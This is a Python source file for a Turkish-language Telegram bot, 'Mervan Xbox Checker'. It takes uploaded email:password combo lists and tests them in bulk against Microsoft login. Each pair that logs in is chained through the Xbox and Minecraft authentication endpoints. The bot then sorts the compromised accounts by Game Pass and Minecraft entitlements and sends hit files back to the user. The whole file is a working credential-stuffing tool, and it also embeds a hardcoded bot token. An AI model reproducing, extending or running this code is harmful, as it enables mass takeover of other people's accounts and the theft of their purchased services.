import os
import sys
import re
import time
import json
import threading
import concurrent.futures
import urllib3
import warnings
from datetime import datetime
from urllib.parse import urlparse, parse_qs

import requests
import telebot
from colorama import Fore, Style, init
from rich.console import Console
from rich.panel import Panel

# ==================== BOT KURULUMU ====================
BOT_TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
bot = telebot.TeleBot(BOT_TOKEN)
telebot.logger.setLevel(50)  # Sadece hataları göster

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ==================== SABİTLER ====================
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 2
REQUEST_TIMEOUT = 5
THREAD_COUNT = 100
UPDATE_INTERVAL = 10          # Her 10 kontrol sonrası bot mesajını güncelle

# ==================== İSTATİSTİK SINIFI ====================
class Stats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.xgp = 0
        self.xgpu = 0
        self.other = 0
        self.retries = 0
        self.start_time = time.time()

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0

# ==================== YARDIMCI FONKSİYONLAR ====================
def create_results_folder(chat_id):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    folder = f"results/chat_{chat_id}_{timestamp}"
    os.makedirs(folder, exist_ok=True)
    return folder

def save_hit(folder, filename, content):
    try:
        with open(os.path.join(folder, filename), 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except:
        pass

def get_banner():
    C = Fore.CYAN
    B = Fore.BLUE
    W = Fore.WHITE
    return r"""
  ____  _     _____ _____ ____ ___ _   _  ____ 
 / ___|| |   | ____| ____|  _ \_ _| \ | |/ ___|
 \___ \| |   |  _| |  _| | |_) | ||  \| | |  _ 
  ___) | |___| |___| |___|  __/| || |\  | |_| |
 |____/|_____|_____|_____|_|  |___|_| \_|\____|
{W}      >>> Mervan - Xbox Checker | By Sleeping Drops | Mervan | https://discord.gg/QnDNWFaZBW<<<
    """.format(C=Fore.CYAN, B=Fore.BLUE, W=Fore.WHITE)

# ==================== KONTROL FONKSİYONLARI (ORİJİNAL) ====================
def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except Exception:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data,
                                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                         allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except Exception:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            response = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                    json=payload,
                                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                    timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    return xbox_token, uhs
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                    json=payload,
                                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                    timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                    headers={'Content-Type': 'application/json'},
                                    timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                   headers={'Authorization': f'Bearer {mc_token}'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', text
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', text
                elif '"product_minecraft"' in text:
                    return 'Minecraft', text
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text:
                        others.append("Bedrock")
                    if 'product_legends' in text:
                        others.append("Legends")
                    if 'product_dungeons' in text:
                        others.append('Dungeons')
                    if others:
                        return 'Other: ' + ', '.join(others), text
                    return None, text
            elif response.status_code == 429:
                time.sleep(2)
                continue
            else:
                return None, None
        except Exception:
            if attempt == max_attempts - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                   headers={'Authorization': f'Bearer {mc_token}'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 429:
                time.sleep(2)
                continue
            elif response.status_code == 404:
                return None
        except Exception:
            if attempt == max_attempts - 1:
                return None
        time.sleep(0.5)
    return None

def check_account(combo, stats, results_folder):
    """Tek bir combo'yu kontrol eder, istatistikleri ve dosyaları günceller."""
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            stats.bad += 1
            stats.checked += 1
            return
        email = parts[0]
        password = ':'.join(parts[1:])

        session = requests.Session()
        session.verify = False

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            stats.errors += 1
            stats.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            stats.twofa += 1
            stats.checked += 1
            save_hit(results_folder, "2FA.txt", f"{email}:{password}")
            return
        elif auth_status == "bad":
            stats.bad += 1
            stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            stats.errors += 1
            stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            stats.errors += 1
            stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            stats.errors += 1
            stats.checked += 1
            return

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            stats.errors += 1
            stats.checked += 1
            return

        account_type, entitlements = check_minecraft_entitlements(session, mc_token)
        if not account_type:
            save_hit(results_folder, "Not_Found.txt", f"{email}:{password} | No Minecraft entitlements")
            stats.bad += 1
            stats.checked += 1
            return

        profile = get_minecraft_profile(session, mc_token)
        if profile:
            name = profile.get('name', 'N/A')
            uuid = profile.get('id', 'N/A')
            capes = ", ".join([cape["alias"] for cape in profile.get("capes", [])])
            if not capes:
                capes = "None"
        else:
            name = "Not Set"
            uuid = "N/A"
            capes = "N/A"

        capture_text = f"Email: {email}\nPassword: {password}\nName: {name}\nUUID: {uuid}\nCapes: {capes}\nAccount Type: {account_type}\n{'='*50}\n"

        save_hit(results_folder, "Hits.txt", f"{email}:{password}")
        save_hit(results_folder, "Capture.txt", capture_text)

        if 'Ultimate' in account_type:
            stats.xgpu += 1
            save_hit(results_folder, "XboxGamePassUltimate.txt", f"{email}:{password}")
        elif 'Game Pass' in account_type:
            stats.xgp += 1
            save_hit(results_folder, "XboxGamePass.txt", f"{email}:{password}")
        elif 'Other' in account_type:
            stats.other += 1
            save_hit(results_folder, "Other.txt", f"{email}:{password} | {account_type}")

        stats.hits += 1
        stats.checked += 1

    except Exception:
        stats.errors += 1
        stats.checked += 1

# ==================== BOT İSTATİSTİK PANOSU ====================
def build_stats_panel(stats):
    """İstatistikleri renkli panel metni olarak döndürür."""
    panel_content = r"""
{G}      .zZz      
{G}     z          {W}┌──────────────┬───────┐
{G}    z           {W}│ Metric       │ Count │
{G}  _---_         {W}├──────────────┼───────┤
{G} ( - . - )      {W}│ Checked      │ {C:<5} │
{G}  | - |         {W}│ Hits         │ {H:<5} │
{G} /  -  \  __    {W}│ Bad          │ {B:<5} │
{G} |     | (oo)   {W}│ 2FA/Secure   │ {T:<5} │
{G} ^^---^^  --    {W}│ XGP Ultimate │ {X:<5} │
{G}                {W}│ CPM          │ {CPM:<5} │
{W}                └──────────────┴───────┘
    """.format(
        G=Fore.LIGHTGREEN_EX, W=Fore.WHITE,
        C=stats.checked, H=stats.hits, B=stats.bad,
        T=stats.twofa, X=stats.xgpu, CPM=stats.get_cpm()
    )
    return panel_content

# ==================== KONTROL İŞLEMİ (THREAD) ====================
def run_checker(chat_id, combos, message_id, results_folder):
    """Combo listesini kontrol eder, bot mesajını günceller, durdurma flag'ini kontrol eder."""
    stats = Stats()
    stop_flag = running_checks.get(chat_id, {}).get('stop_flag', False)
    total = len(combos)
    checked_since_last_update = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = {executor.submit(check_account, combo, stats, results_folder): combo for combo in combos}

        for future in concurrent.futures.as_completed(futures):
            # Durdurma kontrolü
            if running_checks.get(chat_id, {}).get('stop_flag', False):
                executor.shutdown(wait=False, cancel_futures=True)
                break

            checked_since_last_update += 1

            # Belirli aralıkta bot mesajını güncelle
            if checked_since_last_update >= UPDATE_INTERVAL or stats.checked >= total:
                try:
                    panel = build_stats_panel(stats)
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=f"<pre>{panel}</pre>",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
                checked_since_last_update = 0

        # Tüm işlemler bitti veya durduruldu
        # Son durumu güncelle
        try:
            panel = build_stats_panel(stats)
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"<pre>{panel}</pre>\n\n✅ Kontrol tamamlandı!" if not stop_flag else f"<pre>{panel}</pre>\n\n⏹️ Kontrol durduruldu!",
                parse_mode='HTML'
            )
        except Exception:
            pass

    # İşlem bitti, sonuçları gönder
    send_results(chat_id, results_folder, stats)

# ==================== SONUÇLARI GÖNDER ====================
def send_results(chat_id, folder, stats):
    """Sonuç dosyalarını ve özet mesajını gönderir."""
    # Özet mesajı
    summary = (
        f"📊 **Kontrol Tamamlandı**\n"
        f"├ Kontrol edilen: {stats.checked}\n"
        f"├ Hits: {stats.hits}\n"
        f"├ Bad: {stats.bad}\n"
        f"├ 2FA: {stats.twofa}\n"
        f"├ XGP Ultimate: {stats.xgpu}\n"
        f"├ XGP PC: {stats.xgp}\n"
        f"├ Diğer: {stats.other}\n"
        f"└ Hata: {stats.errors}"
    )
    bot.send_message(chat_id, summary, parse_mode='Markdown')

    # Dosyaları gönder
    files_to_send = [
        ("Hits.txt", "Hits.txt"),
        ("Capture.txt", "Capture.txt"),
        ("2FA.txt", "2FA.txt"),
        ("XboxGamePassUltimate.txt", "XboxGamePassUltimate.txt"),
        ("XboxGamePass.txt", "XboxGamePass.txt"),
        ("Other.txt", "Other.txt"),
        ("Not_Found.txt", "Not_Found.txt"),
    ]
    for filename, display_name in files_to_send:
        filepath = os.path.join(folder, filename)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            try:
                with open(filepath, 'rb') as f:
                    bot.send_document(chat_id, f, caption=display_name)
            except Exception:
                pass

# ==================== BOT KOMUTLARI ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(
        message,
        "🤖 **Mervan Xbox Checker Bot**\n\n"
        "Kullanım:\n"
        "1. `/check` komutu ile bir combo dosyası (email:pass) gönderin.\n"
        "2. Bot kontrolü başlatacak ve canlı istatistikleri gösterecek.\n"
        "3. `/stop` ile kontrolü durdurabilirsiniz.\n\n"
        "💡 Dosya uzantısı `.txt` olmalı ve her satırda `email:password` formatında olmalıdır.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['check'])
def check_command(message):
    chat_id = message.chat.id
    # Eğer zaten bir kontrol çalışıyorsa uyar
    if chat_id in running_checks and running_checks[chat_id].get('running', False):
        bot.reply_to(message, "⏳ Zaten bir kontrol çalışıyor! Lütfen önce `/stop` ile durdurun.")
        return

    bot.reply_to(
        message,
        "📤 Lütfen kontrol edilecek combo listesini içeren bir **.txt** dosyası gönderin.",
        parse_mode='Markdown'
    )
    # Dosya beklediğimizi işaretle
    # Bunu için bir sonraki mesajda belge kontrolü yapacağız
    # Geçici olarak beklenen dosya flag'i koyalım
    # Basitçe, bot.register_next_step_handler ile yapabiliriz.
    # Ama daha kolayı: dosya mesajını yakalayıp işleme alalım.

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    # Sadece komutla dosya istendiğinde işle, yoksa uyar
    # Basitçe eğer çalışan kontrol yoksa ve dosya varsa başlat
    if chat_id in running_checks and running_checks[chat_id].get('running', False):
        bot.reply_to(message, "⏳ Zaten bir kontrol çalışıyor! Önce `/stop` ile durdurun.")
        return

    file_info = bot.get_file(message.document.file_id)
    if not file_info.file_path.endswith('.txt'):
        bot.reply_to(message, "❌ Lütfen **.txt** uzantılı bir dosya gönderin.")
        return

    # Dosyayı indir
    downloaded_file = bot.download_file(file_info.file_path)
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
    except Exception:
        bot.reply_to(message, "❌ Dosya okunamadı, UTF-8 kodlaması kullanın.")
        return

    combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    if not combos:
        bot.reply_to(message, "❌ Geçerli combo bulunamadı (email:password formatında olmalı).")
        return

    # Başlangıç mesajı
    init_msg = bot.reply_to(message, "⏳ Kontrol başlatılıyor...")

    # Results klasörü
    folder = create_results_folder(chat_id)

    # Çalışan kontroller listesine ekle
    stop_flag = False
    running_checks[chat_id] = {
        'running': True,
        'stop_flag': stop_flag,
        'thread': None,
        'message_id': init_msg.message_id,
        'folder': folder
    }

    # Kontrolü ayrı thread'de başlat
    def target():
        run_checker(chat_id, combos, init_msg.message_id, folder)
        # İşlem bittiğinde running'i False yap
        if chat_id in running_checks:
            running_checks[chat_id]['running'] = False

    thread = threading.Thread(target=target)
    thread.start()
    running_checks[chat_id]['thread'] = thread

@bot.message_handler(commands=['stop'])
def stop_command(message):
    chat_id = message.chat.id
    if chat_id not in running_checks or not running_checks[chat_id].get('running', False):
        bot.reply_to(message, "❌ Aktif bir kontrol bulunamadı.")
        return

    # Durdurma flag'ini işaretle
    running_checks[chat_id]['stop_flag'] = True
    bot.reply_to(message, "⏹️ Kontrol durduruluyor... Lütfen bekleyin.")

    # Thread'in bitmesini bekleme (isteğe bağlı)
    # Botun yanıt vermesi için beklemeyiz.

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(
        message,
        "📖 **Yardım**\n\n"
        "/start - Botu başlat\n"
        "/check - Combo dosyası göndermek için hazırlan\n"
        "/stop - Çalışan kontrolü durdur\n"
        "/help - Bu mesajı göster",
        parse_mode='Markdown'
    )

# ==================== BOTU BAŞLAT ====================
if __name__ == '__main__':
    # results ana klasörünü oluştur
    os.makedirs("results", exist_ok=True)
    print(get_banner())
    print("[+] Bot başlatılıyor...")
    bot.polling(none_stop=True)
